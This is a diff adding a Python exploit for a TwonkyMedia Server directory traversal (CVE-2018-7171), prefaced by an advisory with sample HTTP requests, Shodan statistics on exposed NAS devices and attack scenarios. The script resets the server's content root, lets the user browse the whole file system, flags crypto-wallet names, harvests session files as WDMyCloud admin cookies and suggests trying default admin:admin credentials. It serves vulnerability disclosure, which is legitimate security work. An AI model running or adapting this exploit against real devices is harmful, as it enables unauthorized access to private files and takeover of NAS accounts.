@@ -1,0 +1,391 @@
+'''
+---------------------------------------------------------------------
+
+1. About
+
+---------------------------------------------------------------------
+# Exploit Title: TwonkyMedia Server 7.0.11-8.5 Directory Traversal
+# Date: 2018-03-27
+# Exploit Author: Sven Fassbender
+# Contact: https://twitter.com/mezdanak
+# Vendor Homepage: http://www.lynxtechnology.com/home
+# Software Link: https://twonky.com/downloads/index.html
+# Version: 7.0.11-8.5
+# CVE : CVE-2018-7171
+# Category: webapps
+
+---------------------------------------------------------------------
+
+2. Background information
+
+---------------------------------------------------------------------
+"With Twonky from Lynx Technology, you can quickly discover your media libraries of digital videos, 
+photos and music in your home, control them from mobile devices, and enjoy them on connected screens and speakers.
+
+Twonky Server is the industry leading DLNA/UPnP Media Server from Lynx Technology that enables sharing media content 
+between connected devices. Twonky Server is used worldwide and is available as a standalone server 
+(end user installable, e.g. for PCs/Macs) or an embedded server for devices such as NAS, routers/gateways and STBs.
+
+Twonky Server’s web UI provides optimal capability for you to easily and reliably control and play back your 
+media files in a variety of ways, and to “beam” those media files to other connected devices." --extract from https://twonky.com
+
+Previous similar vulnerabilities:
+    https://packetstormsecurity.com/files/112227/PacketVideo-TwonkyServer-TwonkyMedia-Directory-Traversal.html
+Fix:
+    https://docs.twonky.com/display/TRN/Twonky+Server+7.0.x
+
+Statistics:
+    Around 20800 TwonkyMedia Servers public available listed on shodan.io worldwide. (https://www.shodan.io/search?query=twonky)
+    Rarely protected by password (only around 2%).
+    
+Top Countries:
+	1. United States
+	2. Germany
+	3. Korea
+	4. Russian Federation
+	5. France
+	6. Italy
+	7. Taiwan
+	8. Poland
+	9. Hungary
+	10. United Kingdom
+
+TwonkyMedia Server seems too be pre installed on a huge range of NAS devices. For example the following NAS devices:
+    Thecus N2310
+    Thecus N4560
+    WDMyCloud, 
+    MyCloudEX2Ultra, 
+    WDMyCloudEX4, 
+    WDMyCloudEX2100, 
+    QNAP, 
+    Zyxel NAS326,
+    Zyxel NAS542,
+    Zyxel NSA310, 
+    Zyxel NSA310S,
+    Zyxel NSA320,
+    Zyxel NSA325-v2
+    ...
+
+Other devices:
+    Belkin routers
+    Zyxel EMG2926-Q10A
+    ...
+
+---------------------------------------------------------------------
+
+3. Vulnerability description
+
+---------------------------------------------------------------------
+TwonkyMedia Server has a function which allows browsing parts of the file system, that are marked as shares by the user.
+By setting the "contentdir" parameter to "/../" with the rpc call "set_all", an attacker can discover the filesystem outside of the user specified shares:
+HTTP request:
+	POST /rpc/set_all HTTP/1.1
+	Host: 192.168.188.9:9000
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
+	Accept: */*
+	Accept-Language: de,en-US;q=0.7,en;q=0.3
+	Accept-Encoding: gzip, deflate
+	Referer: http://192.168.188.9:9000/
+	Content-Type: application/x-www-form-urlencoded
+	X-Requested-With: XMLHttpRequest
+	Content-Length: 228
+	Connection: close
+
+	contentdir=/../
+
+
+Now one can discover the file system with requests like the following:
+HTTP request:
+	GET /rpc/dir?path=/ HTTP/1.1
+	Host: 192.168.188.9:9000
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
+	Accept: */*
+	Accept-Language: de,en-US;q=0.7,en;q=0.3
+	Accept-Encoding: gzip, deflate
+	Referer: http://192.168.188.9:9000/webconfig
+	X-Requested-With: XMLHttpRequest
+	Connection: close
+
+	 
+HTTP response:
+	HTTP/1.1 200 OK
+	Content-Type: text/html; charset=utf-8
+	Content-Language: en
+	Content-Length: 128
+	Date: Sat, 03 Feb 2018 09:31:28 GMT
+	Accept-Ranges: bytes
+	Connection: close
+	Expires: 0
+	Pragma: no-cache
+	Cache-Control: no-cache
+	EXT:
+	Server: Linux/2.x.x, UPnP/1.0, pvConnect UPnP SDK/1.0, Twonky UPnP SDK/1.1
+
+	001D/
+	002D/bin
+	003D/boot
+	004D/CacheVolume
+	005D/DataVolume
+	006D/dev
+	007D/etc
+	008D/home
+	009D/lib
+	010D/media
+	011D/mnt
+	012D/nfs
+	013D/opt
+	014D/proc
+	015D/root
+	016D/run
+	017D/sbin
+	018D/shares
+	019D/srv
+	020D/sys
+	021D/system
+	022D/tmp
+	023D/usr
+	024D/var
+
+---------------------------------------------------------------------
+
+4. Proof of Concept
+
+---------------------------------------------------------------------
+https://github.com/mechanico/sharingIsCaring/blob/master/twonky.py
+
+---------------------------------------------------------------------
+
+5. Attack Scenarios
+
+---------------------------------------------------------------------
+- TwonkyMedia Server path traversal vs. WD MyCloud
+
+	Files with filename representing PHPSESSID admin cookie's were discovered in the /tmp/ directory of a WDMyCloud NAS device:
+
+	$ python twonky.py 192.168.188.9 9000
+	https://www.shodan.io/host/192.168.188.9
+	*** Port 9000 opened ***
+	Run Twonky browser on port 9000 [Y, N]? [Y]
+	*** Get Serverdetails from Twonky ***
+	Server Name: WDMyCloud
+	Serverplatform: armel_gcc473_glibc215_64k
+	Pictures shared: 0
+	Videos shared: 0
+	Twonky Version: 7.2.9-6
+	Build date: 03/25/2015 (mm/dd/yyyy)
+	*** 'contentbase' path set to '/'' ***
+	path nr:
+	------------------------------
+	[...]
+	022 Dir /tmp
+	[...]
+	------------------------------
+	path nr: 022
+	------------------------------
+	[...]
+	059 Fil sess_c61ufnntn31o2ovuj0ncf8fkp1
+	[...]
+	Valid WDMyCloud cookie discovered: {'PHPSESSID': 'c61ufnntn31o2ovuj0ncf8fkp1'}
+	------------------------------
+	path nr:
+
+	This cookie can be used to access the WDMyCloud Rest-Api. (http://ip/api/2.1/rest/...)
+	With this access an attacker can e.g., create/modify users, download all files accessible by the user, update Firmware, ...
+
+
+- TwonkyMedia Server path traversal vs. privacy
+
+	People may store sensitive information on their NAS devices.
+	Such as:
+		- Business information
+		- Health records
+		- Passwords
+		- Credit Cards
+		- Passports
+		- Currcillum Vitaes
+		- Invoices Business/Private
+		- "Private" photos
+		- Illegal material
+		- ...
+
+
+- DMCA protected information
+
+	There maybe also DMCA protected information public available. 
+	Such as:
+		- Movies
+		- Music
+
+---------------------------------------------------------------------
+
+6. Fix
+
+---------------------------------------------------------------------
+All TwonkyMedia Server versions between 7.0.11 -> 8.5 have been tested as vulnerable. 
+While writing this advisory 8.5 is the latest version available:
+https://twonky.com/downloads/index.html
+
+---------------------------------------------------------------------
+'''
+
+import urllib3
+import sys
+import socket
+import requests
+from colorama import init, Fore
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=True)
+
+# Extend KEYWORDS, list if you want. This will highlight files and directory names that include a keyword.
+KEYWORDS = ["CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]
+def keywordDetector(line):
+        for keyword in KEYWORDS:
+                if line.upper().find(keyword) != -1:
+                        return True
+        return False
+def checkPort(host, port):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+                s.connect((host,int(port)))
+                s.settimeout(2)
+                s.shutdown(2)
+                return True
+        except:
+                return False
+
+def setContentBase(host, port):
+        payload = "\ncontentbase=/../\n"
+        url = "http://{0}:{1}/rpc/set_all".format(host, port)
+        try:
+                response = requests.post(url, data=payload, timeout=5)
+        except requests.exceptions.ReadTimeout:
+                print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
+        except requests.exceptions.ChunkedEncodingError:
+                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
+                sys.exit()
+        except requests.exceptions.ConnectionError:
+                url = "https://{0}:{1}/rpc/set_all".format(host, port)
+                response = requests.post(url, data=payload, timeout=5, verify=False)
+        if response.status_code != 200:
+                print (Fore.RED + "*** 'contentbase' cannot be modified, password protection active ***")
+                print (Fore.YELLOW + "*** You should try to login with admin:admin (default creds) ***")
+                sys.exit()
+        else:
+                print (Fore.MAGENTA + "*** 'contentbase' path set to '/'' ***")
+                return True
+
+def serverInfo(host, port):
+        print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
+        try:
+                url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
+                friendlyname = requests.get(url, timeout=5)
+        except requests.exceptions.ConnectionError:
+                url= "https://{0}:{1}/rpc/get_friendlyname".format(host, port)
+                friendlyname = requests.get(url, timeout=5, verify=False)
+        if friendlyname.status_code == 200:
+                print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
+        else:
+                print (Fore.RED + "*** Not authorized to edit settings, password protection active ***")
+                sys.exit()
+        try:
+                url = "http://{0}:{1}/rpc/info_status".format(host, port)
+                infoStatus = requests.get(url, timeout=5)
+        except requests.exceptions.ConnectionError:
+                url = "https://{0}:{1}/rpc/info_status".format(host, port)
+                infoStatus = requests.get(url, timeout=5, verify=False)
+        for line in infoStatus.iter_lines():
+                if line :
+                        if line.find("version") != -1:
+                                lineSplited = line.split("|")
+                                versionNumber = lineSplited[1]
+                                print (Fore.GREEN + "Twonky Version: {0}".format(versionNumber))
+                        elif line.find("serverplatform") != -1:
+                                lineSplited = line.split("|")
+                                serverPlatform = lineSplited[1]
+                                print (Fore.GREEN + "Serverplatform: {0}".format(serverPlatform))
+                        elif line.find("builddate") != -1:
+                                lineSplited = line.split("|")
+                                buildDate = lineSplited[1]
+                                print (Fore.GREEN + "Build date: {0}".format(buildDate))
+                        elif line.find("pictures") != -1:
+                                lineSplited = line.split("|")
+                                pictureCount = lineSplited[1]
+                                print (Fore.GREEN + "Pictures shared: {0}".format(pictureCount))
+                        elif line.find("videos") != -1:
+                                lineSplited = line.split("|")
+                                videoCount = lineSplited[1]
+                                print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
+        return versionNumber
+
+def checkSessionCookie(host, cookieString):
+        url = "http://{0}/api/2.1/rest/device_user".format(host)
+        cookieTemp = cookieString.split("_")
+        cookie = {'PHPSESSID': cookieTemp[1]}
+        response = requests.get(url, timeout=10, cookies=cookie)
+        if response.status_code == 200:
+                return cookie
+        else:
+                return False
+
+def browser(host, port, version):
+        while True:
+                var = raw_input("path nr: ")
+                if var != "exit" :
+                        if version[0] == "8":
+                                url = "http://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
+                        else:
+                                url = "http://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
+                        try:
+                                response = requests.get(url, timeout=5)
+                        except requests.exceptions.ConnectionError:
+                                if version[0] == "8":
+                                        url = "https://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
+                                else:
+                                        url = "https://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
+                                response = requests.get(url, timeout=5, verify=False)
+                        print "-" * 30
+                        validCookieString = ""
+                        for line in response.iter_lines():
+                                if line :
+                                        if len(line) > 3:
+                                                if line[3] == "D":
+                                                        line = line[:4].replace("D", " Dir ") + line[4:]
+                                                        if keywordDetector(line[4:]):
+                                                                print (Fore.RED + line)
+                                                        else:
+                                                                print (Fore.GREEN + line)
+                                                elif line[3] == "F":
+                                                        line = line[:4].replace("F", " Fil ") + line[4:]
+                                                        if keywordDetector(line[4:]):
+                                                                print (Fore.RED + line)
+                                                        elif line[8:13] == "sess_":
+                                                                print line
+                                                                validCookie = checkSessionCookie(host, line[8:])
+                                                                if validCookie != False:
+                                                                        validCookieString = validCookie
+                                                        else:
+                                                                print line
+                                                else:
+                                                        print line
+                        if len(validCookieString) >= 1:
+                                print (Fore.RED + "Valid WDMyCloud cookie discovered: {0}".format(validCookieString))
+                        print "-" * 30
+                elif var == "exit":
+                        sys.exit()
+
+#*** Program start here ***
+if __name__ == '__main__':
+        if len(sys.argv) != 3:
+                print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
+        else:
+                host = sys.argv[1]
+                print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
+                port = sys.argv[2]
+                if checkPort(host, port):
+                        print (Fore.GREEN + "*** Port {0} opened ***".format(port))
+                        twonky = raw_input("Run Twonky browser on port {0} [Y, N]? [Y] ".format(port))
+                        if twonky.upper() != "N":
+                                version = serverInfo(host, port)
+                                if setContentBase(host, port):
+                                        browser(host, port, version)
